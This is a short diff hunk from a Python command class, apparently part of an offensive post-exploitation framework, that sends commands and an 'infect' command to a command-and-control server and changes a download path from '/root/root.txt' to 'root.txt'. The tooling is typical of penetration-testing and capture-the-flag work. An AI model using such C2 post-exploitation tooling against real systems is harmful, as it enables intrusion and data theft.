@@ -1513,7 +1513,7 @@ class PostexpMigratedCommandSet(LazyOwnCommandSet):
         self.issue_command_to_c2(command)
         self.issue_command_to_c2(command_infect)
 
-        self.download_file_from_c2("/root/root.txt")
+        self.download_file_from_c2("root.txt")
 
         copy2clip(command)
         return
